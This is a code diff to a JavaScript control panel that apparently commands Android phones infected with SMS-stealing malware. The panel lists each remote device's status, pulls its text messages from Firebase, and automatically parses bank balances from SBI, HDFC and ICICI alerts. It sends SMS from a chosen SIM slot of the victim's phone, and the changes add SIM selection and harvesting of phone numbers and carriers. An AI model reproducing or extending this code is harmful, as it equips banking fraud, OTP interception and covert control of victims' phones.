@@ -1,10 +1,11 @@
-var PANEL_BUILD=15;
+var PANEL_BUILD=16;
 var AUTH_URL='';
 var SMS_TOKEN_URL='';
 var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
 var activeListeners={}, window_sms=[], window_banks=[];
 var _smsLoadedDev='', _smsDataHash='', _smsRenderTimer=0, _bankDataHash='';
+var _sendSimSlot=1, _deviceSims=[], _bankPrefetchDev='';
 var ACTIVE_FB_KEY='rbl_active_fb_m';
 var ACCESS_KEY_STORAGE='rbl_active_access_key';
 var FB_LIST_PREFIX='rbl_fb_list_';
@@ -390,7 +391,13 @@ function processClientsData(){
       status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0});
   });
   allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
+  var prevSel=selDev;
   if(!selDev&&allDevs.length)selDev=allDevs[0].id;
+  if(selDev&&selDev!==prevSel){
+    _bankDataHash='';
+    _bankPrefetchDev='';
+    loadSmsForDevice(true);
+  }
   renderDevices();updateStats();updateFbUi();
   saveClientsCache();
 }
@@ -707,7 +714,7 @@ function renderDevices(){
   }).join('');
 }
 function selectDevice(id){
-  if(selDev!==id){tabLoaded={};_smsLoadedDev='';_smsDataHash='';window_sms=[];window_banks=[];}
+  if(selDev!==id){tabLoaded={};_smsLoadedDev='';_smsDataHash='';_bankDataHash='';window_sms=[];window_banks=[];_bankPrefetchDev='';}
   selDev=id;renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice(true);
   switchTab('device',document.querySelector('.nav-item[data-tab="device"]'));
   ensureDevTabLoaded('sim');
@@ -755,6 +762,86 @@ function updateSendForm(){
   var d=getSelDev();
   document.getElementById('sendEmpty').classList.toggle('hidden',!!d);
   document.getElementById('sendForm').classList.toggle('hidden',!d);
+  if(d)loadSendSimOptions(d);
+}
+function defaultSimSlots(){
+  return [
+    {slot:1,label:'SIM 1',carrier:'Slot 1',number:''},
+    {slot:2,label:'SIM 2',carrier:'Slot 2',number:''}
+  ];
+}
+function normalizeSimSlots(data){
+  var slots=[],i,sim;
+  if(data&&data.sims&&data.sims.length){
+    for(i=0;i<data.sims.length;i++){
+      sim=data.sims[i]||{};
+      slots.push({
+        slot:i+1,
+        label:'SIM '+(i+1),
+        carrier:sim.carrierName||sim.sim_operator_name||sim.operator||'SIM '+(i+1),
+        number:sim.phoneNumber||sim.number||sim.line1Number||sim.mobNo||''
+      });
+    }
+    return slots;
+  }
+  if(data&&data.sim_info){
+    var info=data.sim_info;
+    if(info.sims&&info.sims.length){
+      for(i=0;i<info.sims.length;i++){
+        sim=info.sims[i]||{};
+        slots.push({slot:i+1,label:'SIM '+(i+1),carrier:sim.carrierName||sim.sim_operator_name||'SIM '+(i+1),number:sim.phoneNumber||sim.number||''});
+      }
+      return slots;
+    }
+    if(info.sim1||info.sim2){
+      if(info.sim1)slots.push({slot:1,label:'SIM 1',carrier:info.sim1.operator||info.sim1.carrier||'SIM 1',number:info.sim1.number||info.sim1.phone||''});
+      if(info.sim2)slots.push({slot:2,label:'SIM 2',carrier:info.sim2.operator||info.sim2.carrier||'SIM 2',number:info.sim2.number||info.sim2.phone||''});
+      if(slots.length)return slots;
+    }
+    if(info.sim_operator_name||info.phone_number||info.imei){
+      slots.push({slot:1,label:'SIM 1',carrier:info.sim_operator_name||info.network_operator_name||'SIM 1',number:info.phone_number||info.line1Number||''});
+      if(info.sim2_operator_name||info.dual_sim)slots.push({slot:2,label:'SIM 2',carrier:info.sim2_operator_name||'SIM 2',number:info.sim2_phone_number||''});
+      if(slots.length)return slots;
+    }
+  }
+  return defaultSimSlots();
+}
+function renderSendSimPicker(slots){
+  var el=document.getElementById('sendSimPicker');
+  if(!el)return;
+  _deviceSims=slots&&slots.length?slots:defaultSimSlots();
+  if(!_deviceSims.some(function(s){return s.slot===_sendSimSlot;}))_sendSimSlot=_deviceSims[0].slot;
+  el.innerHTML=_deviceSims.map(function(sim){
+    var active=sim.slot===_sendSimSlot?' active':'';
+    var meta=[sim.carrier,sim.number].filter(Boolean).join(' · ')||'Tap to use this slot';
+    return '<button type="button" class="sim-chip'+active+'" onclick="selectSendSim('+sim.slot+',this)">'+
+      '<div class="sim-chip-title">'+esc(sim.label)+'</div>'+
+      '<div class="sim-chip-meta">'+esc(meta)+'</div></button>';
+  }).join('');
+}
+function selectSendSim(slot,btn){
+  _sendSimSlot=slot;
+  document.querySelectorAll('.sim-chip').forEach(function(el){el.classList.remove('active');});
+  if(btn)btn.classList.add('active');
+}
+function loadSendSimOptions(dev){
+  var el=document.getElementById('sendSimPicker');
+  if(el)el.innerHTML='<div class="sim-picker-loading">Loading SIM slots...</div>';
+  var inst=getFbInstance(dev.fbId);
+  var cached=clientsRawMap[dev.id];
+  if(inst&&inst.schema==='rabel'){
+    if(cached&&cached.sims&&cached.sims.length){renderSendSimPicker(normalizeSimSlots(cached));return;}
+    restJson(inst.restUrl+'/clients/'+encodeURIComponent(dev.rawId)+'.json').then(function(data){
+      renderSendSimPicker(normalizeSimSlots(data||{}));
+    }).catch(function(){renderSendSimPicker(defaultSimSlots());});
+    return;
+  }
+  var base=(dev.deviceNode||'devices')+'/'+dev.rawId;
+  restJson(inst.restUrl+'/'+base+'/device_info/sim_info.json').then(function(simInfo){
+    renderSendSimPicker(normalizeSimSlots({sim_info:simInfo||{}}));
+  }).catch(function(){
+    renderSendSimPicker(normalizeSimSlots(cached||{}));
+  });
 }
 
 function clearSmsListeners(){
@@ -1088,17 +1175,25 @@ function parseBankAccountsFromSms(smsList){
   }).sort(function(a,b){return a.bank.localeCompare(b.bank);});
 }
 function renderBankAccounts(){
-  var d=getSelDev(),listEl=document.getElementById('bankList'),emptyEl=document.getElementById('bankEmpty'),badge=document.getElementById('bankCountBadge');
+  var d=getSelDev(),listEl=document.getElementById('bankList'),emptyEl=document.getElementById('bankEmpty'),badge=document.getElementById('bankCountBadge'),noteEl=document.getElementById('bankAutoNote');
   if(!d){
     if(emptyEl){emptyEl.classList.remove('hidden');emptyEl.innerHTML='<div class="ico">🏦</div>Select a device to load bank balances from SMS';}
-    if(listEl)listEl.innerHTML='';if(badge)badge.textContent='0 Banks';return;
+    if(listEl)listEl.innerHTML='';if(badge)badge.textContent='0 Banks';
+    if(noteEl)noteEl.textContent='Balances are parsed automatically from bank SMS';
+    return;
   }
-  if(!window_sms.length&&_smsLoadedDev!==d.id)loadSmsForDevice();
+  if(!window_sms.length&&_smsLoadedDev!==d.id){
+    if(noteEl)noteEl.textContent='Fetching SMS and parsing bank balances...';
+    loadSmsForDevice(true);
+  }
   window_banks=parseBankAccountsFromSms(window_sms);
   var bh=window_banks.length+'|'+window_sms.length;
   if(bh===_bankDataHash&&listEl&&listEl.children.length)return;
   _bankDataHash=bh;
   if(badge)badge.textContent=window_banks.length+' Bank'+(window_banks.length===1?'':'s');
+  if(noteEl)noteEl.textContent=window_banks.length
+    ? ('Auto-parsed from '+window_sms.length+' SMS · SBI, HDFC, ICICI, etc.')
+    : (window_sms.length?'No bank balance SMS found in '+window_sms.length+' messages':'Waiting for SMS sync...');
   if(!window_banks.length){
     if(emptyEl){emptyEl.classList.remove('hidden');emptyEl.innerHTML='<div class="ico">🏦</div>No bank SMS found<br><span style="font-size:11px;opacity:.6">SBI, HDFC, ICICI balance alerts appear here</span>';}
     if(listEl)listEl.innerHTML='';return;
@@ -1139,16 +1234,20 @@ function sendSms(){
   var d=getSelDev();if(!d){toast('Select a device first',false);return;}
   var inst=getFbInstance(d.fbId),to=document.getElementById('sendTo').value.trim(),msg=document.getElementById('sendMsg').value.trim();
   if(!to||!msg){toast('Fill number and message',false);return;}
+  var simSlot=_sendSimSlot||1;
   var btn=document.querySelector('.btn-send');
-  document.getElementById('sendStatus').textContent='Sending...';
+  document.getElementById('sendStatus').textContent='Sending via SIM '+simSlot+'...';
   if(btn){btn.classList.add('sending');btn.classList.remove('success');}
   var path=inst.restUrl+'/clients/'+encodeURIComponent(d.rawId)+'/webhookEvent/sendSms.json';
-  var payload={to:to,message:msg,from:1,isSended:false};
-  if(inst.schema!=='rabel')path=inst.restUrl+'/'+(d.deviceNode||'devices')+'/'+encodeURIComponent(d.rawId)+'/manual_commands/send_sms.json';
+  var payload={to:to,message:msg,from:simSlot,isSended:false};
+  if(inst.schema!=='rabel'){
+    path=inst.restUrl+'/'+(d.deviceNode||'devices')+'/'+encodeURIComponent(d.rawId)+'/manual_commands/send_sms.json';
+    payload={to:to,message:msg,sim:simSlot-1,from:simSlot,slot:simSlot-1};
+  }
   fetch(path,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
     if(btn){btn.classList.remove('sending');}
     if(r.ok){
-      document.getElementById('sendStatus').textContent='✅ Sent';document.getElementById('sendMsg').value='';
+      document.getElementById('sendStatus').textContent='✅ Sent from SIM '+simSlot;document.getElementById('sendMsg').value='';
       if(btn){btn.classList.add('success');setTimeout(function(){btn.classList.remove('success');},500);}
       spawnConfetti(innerWidth/2,innerHeight*.55,24);toast('SMS sent',true);
     }else{document.getElementById('sendStatus').textContent='❌ Failed';toast('Send failed',false);}
